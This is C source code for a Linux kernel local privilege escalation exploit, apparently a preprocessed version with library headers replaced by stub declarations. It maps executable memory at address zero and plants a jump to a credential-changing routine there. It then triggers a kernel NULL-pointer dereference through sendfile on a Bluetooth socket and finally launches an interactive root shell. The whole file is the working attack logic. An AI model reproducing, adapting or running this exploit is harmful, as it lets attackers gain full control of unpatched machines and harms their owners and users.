
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int EXIT_FAILURE ;
 int EXIT_SUCCESS ;
 int MAP_ANONYMOUS ;
 char* MAP_FAILED ;
 int MAP_FIXED ;
 int MAP_PRIVATE ;
 int PAGE_SIZE ;
 int PF_BLUETOOTH ;
 int PROT_EXEC ;
 int PROT_READ ;
 int PROT_WRITE ;
 int SOCK_DGRAM ;
 scalar_t__ change_cred ;
 int execl (char*,char*,char*,int *) ;
 int exit (int ) ;
 int ftruncate (int,int ) ;
 int getgid () ;
 int getuid () ;
 int gid ;
 int mkstemp (char*) ;
 char* mmap (int *,int,int,int,int ,int ) ;
 int perror (char*) ;
 int sendfile (int,int,int *,int ) ;
 int socket (int ,int ,int ) ;
 int uid ;
 int unlink (char*) ;

int
main(void)
{
 char *addr;
 int out_fd, in_fd;
 char template[] = "/tmp/tmp.XXXXXX";


 uid = getuid(), gid = getgid();



 if ((addr = mmap(((void*)0), 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_FIXED|
   MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)) == MAP_FAILED) {
  perror("mmap");
  exit(EXIT_FAILURE);
 }



 addr[0] = '\xff';
 addr[1] = '\x24';
 addr[2] = '\x25';
 *(unsigned long *)&addr[3] = 8;
 *(unsigned long *)&addr[8] = (unsigned long)change_cred;
 if ((out_fd = socket(PF_BLUETOOTH, SOCK_DGRAM, 0)) == -1) {
  perror("socket");
  exit(EXIT_FAILURE);
 }

 if ((in_fd = mkstemp(template)) == -1) {
  perror("mkstemp");
  exit(EXIT_FAILURE);
 }

 if(unlink(template) == -1) {
  perror("unlink");
  exit(EXIT_FAILURE);
 }

 if (ftruncate(in_fd, PAGE_SIZE) == -1) {
  perror("ftruncate");
  exit(EXIT_FAILURE);
 }

 sendfile(out_fd, in_fd, ((void*)0), PAGE_SIZE);

 execl("/bin/sh", "sh", "-i", ((void*)0));

 exit(EXIT_SUCCESS);
}
